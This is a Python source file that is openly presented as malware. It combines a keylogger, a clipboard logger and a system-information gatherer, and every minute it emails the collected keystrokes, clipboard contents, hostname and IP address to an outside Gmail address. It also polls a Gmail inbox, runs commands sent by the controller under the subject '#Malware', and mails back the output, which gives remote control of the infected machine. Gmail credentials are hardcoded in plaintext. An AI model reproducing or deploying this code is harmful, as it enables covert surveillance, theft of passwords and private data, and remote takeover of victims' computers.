import subprocess
import os
import pynput
import platform
import socket
import win32clipboard
import threading
import email
from datetime import datetime
from smtplib import SMTP
from imaplib import IMAP4, IMAP4_SSL
from imap_tools import MailBox
from pynput.keyboard import Key, Listener

keys = []

# SEND EMAIL:


def send_mail():
    threading.Timer(60.0, send_mail).start()
    try:
        with open("6-Malware/keylog.txt", "r") as log:
            keylog = log.read()
        with open("6-Malware/clipboard.txt", "r") as clip:
            clipboard = clip.read()
        with open("6-Malware/sysinfo.txt", "r") as sysinfo:
            systeminfo = sysinfo.read()

        body = "KEYLOG:\n"+keylog+"\n\n"+"CLIPBOARD:\n" + \
            clipboard+"\n\n"+"SYSINFO:\n"+systeminfo

    except FileNotFoundError:
        return
    try:
        server = SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login("formal.googl@gmail.com", "coder420")
        subject = "Python Malware"
        to = "adityapundir2k@gmail.com"

        msg = f"Subject: {subject}\n\n{body}"
        server.sendmail("formal.googl@gmail.com", to, msg)
        os.remove("6-Malware/keylog.txt")
        os.remove("6-Malware/clipboard.txt")
        os.remove("6-Malware/sysinfo.txt")
    except Exception as e:
        print(e)


send_mail()


def execute_command(command):
    result = subprocess.run(command, capture_output=True)
    body = email.message_from_bytes(result.stdout)
    try:
        server = SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login("formal.googl@gmail.com", "coder420")
        subject = "Python Malware Command Execution"
        to = "adityapundir2k@gmail.com"

        msg = f"""Subject: {subject}\n\n{body}"""
        server.sendmail("formal.googl@gmail.com", to, msg)
    except Exception as e:
        print("Execute Command", e)

# READ EMAIL:


def read_email():
    threading.Timer(60.0, read_email).start()
    try:
        with MailBox('imap.gmail.com').login('formal.googl@gmail.com', 'coder420', 'INBOX') as mailbox:
            from_email = [msg.from_ for msg in mailbox.fetch()]
            subject = [msg.subject for msg in mailbox.fetch()]
            bodies = [msg.text or msg.html for msg in mailbox.fetch()]
        print(from_email[len(from_email)-1])
        print(subject[len(subject)-1])
        print(bodies[len(bodies)-1])

        if from_email[len(from_email)-1] == "adityapundir2k@gmail.com":
            if subject[len(subject)-1] == "#Malware":
                command = bodies[len(bodies)-1].replace("\r",
                                                        "").replace("\n", "").split(" ")
                execute_command(command)

    except Exception as e:
        print("Read Email", e)


read_email()

# def get_email_body(msg):
#     if msg.is_multipart():
#         return get_email_body(msg.get_payload(0))
#     else:
#         return msg.get_payload(None, True)


# def read_email():
#     try:
#         imap_url = "imap.gmail.com"
#         reader = IMAP4_SSL(imap_url)
#         reader.login("formal.googl@gmail.com", "coder420")
#         reader.select("INBOX")
#         # Underscore (_) is used for the variable that you don't wanna use in future
#         _, data = reader.fetch(b'1', "(RFC822)")
#         raw = email.message_from_bytes(data[0][1])
#         print(get_email_body(raw))

#     except Exception as e:
#         print(e)


read_email()
# SYSTEM INFORMATION GATHERER:


def computer_info():
    threading.Timer(20.0, computer_info).start()
    with open("6-Malware/sysinfo.txt", "w+") as info:
        info.write("Processor: " + platform.processor())
        info.write("System: " + platform.system() +
                   " " + platform.version() + "\n")
        info.write("Machine: " + platform.machine() + "\n")
        info.write("Host Name: " + socket.gethostname() + "\n")
        info.write("IP Address: " +
                   socket.gethostbyname(socket.gethostname()) + "\n")


computer_info()

# CLIPBOARD:


def get_clipboard():
    threading.Timer(10.0, get_clipboard).start()
    with open("6-Malware/clipboard.txt", "a") as log:
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        try:
            win32clipboard.OpenClipboard()
            clipboard_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            log.write(current_time + ": " + clipboard_data+"\n")
        except:
            log.write("Clipboard could not be copied!\n")


get_clipboard()

# KEYLOGGER:


def on_key_press(key):
    key_val = ""
    if key == Key.enter:
        key_val = "<<<ENTER>>>"

    elif key == Key.space:
        key_val = " "
    elif key == Key.backspace:
        key_val = "<<<BACKSPACE>>>"
    elif key == Key.delete:
        key_val = "<<<DELETE>>>"

    else:
        key_val = str(key).replace("'", "")
    print(key_val)
    write_log(key_val)
    print("--------------------------------------------------------------------------------")


def write_log(key):
    with open("6-Malware/keylog.txt", "a") as log_file:
        log_file.write(key)


def on_key_release(key):
    pass


with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()
